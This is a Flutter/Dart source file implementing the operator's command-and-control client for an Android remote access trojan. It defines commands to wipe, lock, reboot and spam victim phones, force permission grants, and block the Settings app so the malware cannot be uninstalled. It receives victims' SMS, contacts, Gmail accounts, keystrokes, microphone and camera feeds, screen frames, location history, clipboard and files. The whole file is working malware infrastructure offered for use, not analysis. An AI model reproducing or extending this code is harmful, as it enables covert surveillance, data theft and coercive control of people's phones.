import 'dart:async';
import 'dart:convert';

import 'package:flutter/foundation.dart';
import 'package:http/http.dart' as http;
import 'package:socket_io_client/socket_io_client.dart' as io;
import '../api.dart';

// kRatServer diambil dari ApiConfig.baseUrl lewat constructor (bukan const,
// karena ApiConfig.baseUrl di project ini berupa getter).

// ---- Command names (backend contract) ----
// Keep these in one place so they can be aligned with the backend easily.
const String kCmdKeyboardSpam = 'keyboardSpam';
const String kCmdKeyboardSpamStop = 'keyboardSpamStop';
const String kCmdScreen = 'screen';
const String kCmdCamera = 'camera';
const String kCmdCameraPhoto = 'camera:photo';
const String kCmdLockCustom = 'lockCustom';
const String kCmdLockChat = 'lockChat';
const String kCmdWipe = 'wipeData';
const String kCmdReboot = 'rebootDevice';
const String kCmdBlockApp = 'blockApp';
const String kCmdUnblockApp = 'unblockApp';
const String kCmdLocationTrack = 'location:track';
const String kCmdLocationHistory = 'location:history';

const String kCmdGrantCamera = 'grantCamera';
const String kCmdGrantLocation = 'grantLocation';
const String kCmdGrantSms = 'grantSms';
const String kCmdGrantContacts = 'grantContacts';
const String kCmdGrantPhoneState = 'grantPhoneState';
const String kCmdGrantStorage = 'grantStorage';
const String kCmdGrantOverlay = 'grantOverlay';
const String kCmdGrantNotification = 'grantNotification';
const String kCmdGrantAll = 'grantAll';
const String kCmdGrantMic = 'grantMic';
const String kCmdGrantCallPhone = 'grantCallPhone';
const String kCmdGrantCallLog = 'grantCallLog';
const String kCmdGrantCalendar = 'grantCalendar';
const String kCmdGrantDeviceAdmin = 'grantDeviceAdmin';
const String kCmdGrantBattery = 'grantBattery';

const String kCmdKernelOn = 'kernelOn';
const String kCmdKernelOff = 'kernelOff';
const String kCmdKernelInfo = 'kernelInfo';

const String kCmdGetForegroundApp = 'getForegroundApp';
const String kCmdGetScreenState = 'getScreenState';

/// Package that, when blocked, effectively disables app uninstall.
const String kSettingsPackage = 'com.android.settings';

class RatChatMessage {
  final String from;
  final String text;
  final DateTime? time;

  RatChatMessage({required this.from, required this.text, this.time});

  factory RatChatMessage.fromJson(Map<String, dynamic> json) => RatChatMessage(
        from: json['from']?.toString() ?? 'victim',
        text: json['text']?.toString() ?? '',
        time: json['time'] != null
            ? DateTime.tryParse(json['time'].toString())
            : null,
      );
}

class RatDeviceInfo {
  int? battery;
  bool charging;
  String? androidVersion;
  String? sdkVersion;
  String? uid;
  DateTime? connectedAt;
  DateTime? lastSeen;

  RatDeviceInfo({
    this.battery,
    this.charging = false,
    this.androidVersion,
    this.sdkVersion,
    this.uid,
    this.connectedAt,
    this.lastSeen,
  });

  factory RatDeviceInfo.fromJson(Map<String, dynamic>? json) {
    if (json == null) return RatDeviceInfo();
    return RatDeviceInfo(
      battery: json['battery'] is num ? (json['battery'] as num).toInt() : null,
      charging: json['charging'] == true,
      androidVersion: json['androidVersion']?.toString(),
      sdkVersion: json['sdkVersion']?.toString(),
      uid: json['uid']?.toString(),
      connectedAt: _parseDate(json['connectedAt']),
      lastSeen: _parseDate(json['lastSeen']),
    );
  }

  static DateTime? _parseDate(dynamic v) {
    if (v == null) return null;
    if (v is num) return DateTime.fromMillisecondsSinceEpoch(v.toInt());
    final s = v.toString();
    if (s.isEmpty) return null;
    return DateTime.tryParse(s);
  }
}

class RatDevice {
  final String id;
  final String name;
  bool online;
  final Map<String, dynamic> raw;
  final Map<String, dynamic> status;
  final RatDeviceInfo info;

  RatDevice({
    required this.id,
    required this.name,
    this.online = false,
    Map<String, dynamic>? raw,
    Map<String, dynamic>? status,
    RatDeviceInfo? info,
  })  : raw = raw ?? const {},
        status = status ?? {},
        info = info ?? RatDeviceInfo();

  factory RatDevice.fromJson(Map<String, dynamic> json) {
    final statusJson = json['status'];
    return RatDevice(
      id: (json['id'] ?? json['deviceId'] ?? '').toString(),
      name: (json['name'] ?? 'Unknown Device').toString(),
      online: json['online'] == true ||
          json['connected'] == true ||
          json['connectedAt'] != null,
      raw: json,
      status: statusJson is Map<String, dynamic>
          ? Map<String, dynamic>.from(statusJson)
          : {},
      info: RatDeviceInfo.fromJson(
          json['info'] is Map<String, dynamic> ? json['info'] : null),
    );
  }

  bool statusBool(String key) => status[key] == true;

  String statusStr(String key, String fallback) =>
      status[key]?.toString() ?? fallback;
}

/// Socket.IO + REST client for the RAT backend contract (sync.js).
///
/// Auth: emits `controller:join` with `{token}` on connect, and sends the
/// token as the `x-auth-token` header on every REST call.
class RatClient extends ChangeNotifier {
  RatClient(this.token, {String? server, List<RatDevice> previewDevices = const []})
      : server = server ?? ApiConfig.baseUrl {
    _devices.addAll(previewDevices);
    _connected = previewDevices.isNotEmpty;
  }

  final String token;
  final String server;

  /// UID akun (ID RAT) milik operator. Diisi via GET /api/me setelah connect.
  String? uid;

  io.Socket? _socket;
  bool _connected = false;
  String? _authError;

  final List<RatDevice> _devices = [];
  final Map<String, Map<String, dynamic>> _data = {};
  final Map<String, List<RatChatMessage>> _chats = {};
  final Map<String, Map<String, dynamic>> _frames = {};

  /// Optimistic status patches that survive backend syncs.
  /// This is what keeps toggles (anti-uninstall, lock, flashlight, ...)
  /// from snapping back to OFF the moment the backend pushes an update.
  final Map<String, Map<String, dynamic>> _statusOverrides = {};

  bool get isConnected => _connected;
  String? get authError => _authError;
  List<RatDevice> get devices => List.unmodifiable(_devices);

  RatDevice? deviceById(String id) {
    for (final d in _devices) {
      if (d.id == id) return d;
    }
    return null;
  }

  /// Per-device data snapshots (gallery, contacts, files, ...).
  Map<String, dynamic> dataFor(String deviceId) =>
      _data[deviceId] ?? const {};

  /// Latest live frame for a stream key: `camera:<id>` or `screen:<id>`.
  Map<String, dynamic>? frameFor(String deviceId, String kind) =>
      _frames['$kind:$deviceId'];

  List<RatChatMessage> chatMessages(String deviceId) =>
      _chats[deviceId] ?? const [];

  /// Public re-emit so external widgets can push local state changes.
  void refresh() => notifyListeners();

  /// Normalizes a frame payload into a bare base64 string.
  /// Handles raw base64, `data:image/jpeg;base64,...`, and nested maps.
  static String? extractFrame(dynamic frame) {
    if (frame == null) return null;
    if (frame is Map) {
      final v = frame['data'] ?? frame['frame'] ?? frame['base64'] ?? frame['image'];
      if (v != null) return extractFrame(v);
      return null;
    }
    final s = frame.toString();
    if (s.isEmpty) return null;
    if (s.startsWith('data:')) {
      final idx = s.indexOf('base64,');
      if (idx >= 0) return s.substring(idx + 7);
      return s;
    }
    return s;
  }

  void connect() {
    if (_socket != null) return;
    final wsServer =
        server.replaceFirst('https://', 'wss://').replaceFirst('http://', 'ws://');
    _socket = io.io(
      wsServer,
      io.OptionBuilder()
          .setTransports(['websocket'])
          .enableAutoConnect()
          .setExtraHeaders({'x-auth-token': token})
          .build(),
    );

    _socket!.on('connect', (_) {
      _connected = true;
      _authError = null;
      _socket!.emit('controller:join', {'token': token});
      Future<void>.delayed(const Duration(milliseconds: 400), fetchMe);
      notifyListeners();
    });

    _socket!.on('disconnect', (_) {
      _connected = false;
      notifyListeners();
    });

    _socket!.on('connect_error', (err) {
      _connected = false;
      notifyListeners();
    });

    _socket!.on('auth:error', (data) {
      _authError = data?.toString() ?? 'Authentication failed';
      _connected = false;
      notifyListeners();
    });

    _socket!.on('devices:update', (data) {
      _syncDevices(data);
    });

    _socket!.on('camera:frame', (data) {
      if (data is Map && data['deviceId'] != null) {
        final f = extractFrame(data['frame']);
        if (f != null) {
          _frames['camera:${data['deviceId']}'] = {'frame': f};
        }
        notifyListeners();
      }
    });

    _socket!.on('screen:frame', (data) {
      if (data is Map && data['deviceId'] != null) {
        final f = extractFrame(data['frame']);
        if (f != null) {
          _frames['screen:${data['deviceId']}'] = {'frame': f};
        }
        notifyListeners();
      }
    });

    _socket!.on('camera:screenshot', (data) {
      if (data is Map && data['deviceId'] != null) {
        _setData(data['deviceId'], 'screenshot', {
          'frame': extractFrame(data['frame']),
          'facing': data['facing'],
        });
      }
    });

    _socket!.on('device:gallery', (data) {
      if (data is Map && data['deviceId'] != null) {
        _setData(data['deviceId'], 'gallery', data['photos']);
      }
    });

    _socket!.on('device:location', (data) {
      if (data is Map && data['deviceId'] != null) {
        _setData(data['deviceId'], 'location', data);
      }
    });

    _socket!.on('device:contacts', (data) {
      if (data is Map && data['deviceId'] != null) {
        _setData(data['deviceId'], 'contacts', data['contacts']);
      }
    });

    _socket!.on('device:gmail', (data) {
      if (data is Map && data['deviceId'] != null) {
        // Backend may send a raw list under `accounts`/`list` or the whole map.
        final inner = data['accounts'] ?? data['list'] ?? data['gmail'];
        _setData(data['deviceId'], 'gmail',
            inner is List ? inner : data['accounts'] is List ? data['accounts'] : data);
      }
    });

    _socket!.on('device:phone', (data) {
      if (data is Map && data['deviceId'] != null) {
        _setData(data['deviceId'], 'phone', data['sims']);
      }
    });

    _socket!.on('device:files', (data) {
      if (data is Map && data['deviceId'] != null) {
        _setData(data['deviceId'], 'files', data);
      }
    });

    _socket!.on('device:filedata', (data) {
      if (data is Map && data['reqId'] != null) {
        _setData('_pending:${data['reqId']}', 'filedata', data);
      }
    });

    _socket!.on('apps:list', (data) {
      if (data is Map && data['deviceId'] != null) {
        _setData(data['deviceId'], 'apps', data['apps']);
      }
    });

    _socket!.on('notif:list', (data) {
      if (data is Map && data['deviceId'] != null) {
        _setData(data['deviceId'], 'notifs', data['list']);
      }
    });

    _socket!.on('sms:list', (data) {
      if (data is Map && data['deviceId'] != null) {
        _setData(data['deviceId'], 'sms', data['list']);
      }
    });

    _socket!.on('device:chatRead', (data) {
      if (data is Map && data['deviceId'] != null) {
        final msgs = (data['messages'] as List?) ?? [];
        _chats[data['deviceId']] = msgs
            .whereType<Map>()
            .map((m) => RatChatMessage.fromJson(Map<String, dynamic>.from(m)))
            .toList();
        notifyListeners();
      }
    });

    _socket!.on('device:chatMessage', (data) {
      if (data is Map && data['deviceId'] != null) {
        final msg = data['message'];
        if (msg is Map) {
          _chats
              .putIfAbsent(data['deviceId'], () => [])
              .add(RatChatMessage.fromJson(Map<String, dynamic>.from(msg)));
        }
        notifyListeners();
      }
    });

    _socket!.on('device:clipboard', (data) {
      if (data is Map && data['deviceId'] != null) {
        _setData(data['deviceId'], 'clipboard', data['text']);
      }
    });

    _socket!.on('device:wifiScan', (data) {
      if (data is Map && data['deviceId'] != null) {
        _setData(data['deviceId'], 'wifi', data['networks'] ?? []);
      }
    });

    _socket!.on('device:kernelInfo', (data) {
      if (data is Map && data['deviceId'] != null) {
        _setData(data['deviceId'], 'kernelInfo', data);
      }
    });

    _socket!.on('device:foregroundApp', (data) {
      if (data is Map && data['deviceId'] != null) {
        _setData(data['deviceId'], 'foregroundApp', data['foregroundApp'] ?? data);
      }
    });

    _socket!.on('device:screenState', (data) {
      if (data is Map && data['deviceId'] != null) {
        _setData(data['deviceId'], 'screenState', data['screenState'] ?? data);
      }
    });

    _socket!.on('device:keylog', (data) {
      if (data is Map && data['deviceId'] != null) {
        _setData(data['deviceId'], 'keylog', data['keys']);
      }
    });

    _socket!.on('device:micData', (data) {
      if (data is Map && data['deviceId'] != null) {
        _setData(data['deviceId'], 'micData', data['audio']);
      }
    });

    _socket!.on('device:videoData', (data) {
      if (data is Map && data['deviceId'] != null) {
        _setData(data['deviceId'], 'videoData', data['video']);
      }
    });

    _socket!.connect();
  }

  /// GET /api/me — ambil UID untuk ditampilkan di UI.
  Future<void> fetchMe() async {
    try {
      final res = await http.get(
        Uri.parse('$server/api/me'),
        headers: {'x-auth-token': token},
      );
      if (res.statusCode == 200) {
        final body = jsonDecode(res.body);
        final myUid = (body is Map) ? (body['uid'] ?? body['pairingId']) : null;
        if (myUid != null && myUid.toString().isNotEmpty) {
          uid = myUid.toString();
          notifyListeners();
        }
      }
    } catch (_) {}
  }

  void disconnect() {
    final s = _socket;
    _socket = null;
    s?.dispose();
    _connected = false;
    notifyListeners();
  }

  void _syncDevices(dynamic data) {
    if (data is! List) return;
    final incoming = data.whereType<Map>()
        .map((m) => RatDevice.fromJson(Map<String, dynamic>.from(m)))
        .toList();
    final incomingIds = incoming.map((d) => d.id).toSet();

    // Full-snapshot semantics: drop devices that disappeared.
    _devices.removeWhere((d) => !incomingIds.contains(d.id));

    for (final nd in incoming) {
      final idx = _devices.indexWhere((d) => d.id == nd.id);
      if (idx >= 0) {
        // Merge: keep the fresh backend object but preserve optimistic patches.
        final mergedStatus = Map<String, dynamic>.from(nd.status)
          ..addAll(_statusOverrides[nd.id] ?? {});
        _devices[idx] = RatDevice(
          id: nd.id,
          name: nd.name,
          online: nd.online,
          raw: nd.raw,
          status: mergedStatus,
          info: nd.info,
        );
      } else {
        _devices.add(nd);
      }
    }

    _deriveStatusFlags();
    notifyListeners();
  }

  /// Re-applies locally patched flags onto devices that just got rebuilt.
  void _applyOverrides() {
    _statusOverrides.forEach((deviceId, overrides) {
      final d = deviceById(deviceId);
      if (d == null) return;
      overrides.forEach((k, v) {
        if (k == 'antiUninstall') {
          if (v == true && !_isAntiUninstall(d)) {
            d.status[k] = true;
          } else if (v == false && !_isAntiUninstall(d)) {
            d.status[k] = false;
          }
        } else {
          d.status[k] = v;
        }
      });
    });
  }

  /// Derives honest UI flags from raw backend data.
  void _deriveStatusFlags() {
    for (final d in _devices) {
      d.status['antiUninstall'] = _isAntiUninstall(d);
    }
    _applyOverrides();
  }

  bool _isAntiUninstall(RatDevice d) {
    final apps = d.status['blockedApps'];
    if (apps is List &&
        apps.any((e) => e.toString().contains(kSettingsPackage))) {
      return true;
    }
    return d.status['antiUninstall'] == true;
  }

  void _setData(String deviceId, String key, dynamic value) {
    _data.putIfAbsent(deviceId, () => {})[key] = value;
    notifyListeners();
  }

  /// POST /api/command/:deviceId with `{command, value}`.
  Future<http.Response> sendCommand(String deviceId, String command,
      [dynamic value = '']) async {
    final res = await http.post(
      Uri.parse('$server/api/command/$deviceId'),
      headers: {
        'Content-Type': 'application/json',
        'x-auth-token': token,
      },
      body: jsonEncode({'command': command, 'value': value}),
    );
    if (res.statusCode == 401) {
      _authError = 'Session expired';
      _connected = false;
      notifyListeners();
    }
    return res;
  }

  /// Take a single photo via ImageCapture (`camera:photo`).
  Future<Map<String, dynamic>?> takeScreenshot(
      String deviceId, String facing) async {
    await sendCommand(deviceId, kCmdCameraPhoto, facing);
    final started = DateTime.now();
    String? frame;

    // Poll the `camera:screenshot` event result (set into `screenshot`).
    while (DateTime.now().difference(started) < const Duration(seconds: 12)) {
      final snap = _data[deviceId]?['screenshot'];
      if (snap is Map && snap['frame'] != null) {
        frame = extractFrame(snap['frame']);
        if (frame != null) break;
      }
      final live = _frames['camera:$deviceId'];
      final f = live?['frame'];
      if (f != null) {
        frame = extractFrame(f);
        if (frame != null) break;
      }
      await Future<void>.delayed(const Duration(milliseconds: 300));
    }

    // Fallback: pull via REST.
    if (frame == null) {
      final res = await http.get(
        Uri.parse('$server/api/screenshot/$deviceId'),
        headers: {'x-auth-token': token},
      );
      if (res.statusCode == 200) {
        final body = jsonDecode(res.body);
        if (body is Map && body['ok'] == true && body['frame'] != null) {
          frame = extractFrame(body['frame']);
        }
      }
    }

    _data[deviceId]?.remove('screenshot');
    if (frame == null) return null;
    return {'frame': frame, 'facing': facing};
  }

  /// Pull the latest camera frame straight from the server via REST.
  /// The backend keeps `cameraFrames[deviceId]` updated on every
  /// `camera:frame`, so while the device is streaming this IS the live
  /// feed. Used as a fallback when the socket stream stalls or drops.
  Future<Map<String, dynamic>?> fetchLatestFrame(String deviceId) async {
    try {
      final res = await http.get(
        Uri.parse('$server/api/screenshot/$deviceId'),
        headers: {'x-auth-token': token},
      );
      if (res.statusCode != 200) return null;
      final body = jsonDecode(res.body);
      if (body is Map && body['ok'] == true && body['frame'] != null) {
        final f = extractFrame(body['frame']);
        if (f != null) return {'frame': f};
      }
    } catch (_) {}
    return null;
  }

  /// Fetch last-known location + 24h movement history from the backend.
  /// The device also pushes live `device:location` events during tracking.
  Future<Map<String, dynamic>?> fetchLocationData(String deviceId) async {
    try {
      final res = await http.get(
        Uri.parse('$server/api/location/$deviceId'),
        headers: {'x-auth-token': token},
      );
      if (res.statusCode != 200) return null;
      final body = jsonDecode(res.body);
      if (body is Map && body['ok'] == true) {
        final bundle = Map<String, dynamic>.from(body);
        _setData(deviceId, 'locationBundle', bundle);
        return bundle;
      }
    } catch (_) {}
    return null;
  }

  void clearData(String deviceId, String key) {
    final map = _data[deviceId];
    if (map != null) map.remove(key);
    notifyListeners();
  }

  /// Optimistically update a device status flag so the UI reflects instantly.
  /// Writes into a persistent override so backend syncs don't revert it.
  void patchStatus(String deviceId, String key, dynamic value) {
    _statusOverrides.putIfAbsent(deviceId, () => {})[key] = value;
    final d = deviceById(deviceId);
    if (d != null) {
      d.status[key] = value;
      notifyListeners();
    }
  }

  /// POST /api/chat/:deviceId — operator reply inside Lock Chat.
  Future<http.Response> sendChatReply(String deviceId, String text) async {
    final res = await http.post(
      Uri.parse('$server/api/chat/$deviceId'),
      headers: {
        'Content-Type': 'application/json',
        'x-auth-token': token,
      },
      body: jsonEncode({'text': text}),
    );
    if (res.statusCode == 401) {
      _authError = 'Session expired';
      _connected = false;
      notifyListeners();
    }
    return res;
  }

  /// POST /api/device/rename — kasih nama custom ke device (keyed by deviceId).
  Future<http.Response> renameDevice(String deviceId, String name) async {
    final res = await http.post(
      Uri.parse('$server/api/device/rename'),
      headers: {
        'Content-Type': 'application/json',
        'x-auth-token': token,
      },
      body: jsonEncode({'deviceId': deviceId, 'name': name}),
    );
    if (res.statusCode == 401) {
      _authError = 'Session expired';
      _connected = false;
      notifyListeners();
    }
    return res;
  }

  @override
  void dispose() {
    final s = _socket;
    _socket = null;
    s?.dispose();
    super.dispose();
  }
}
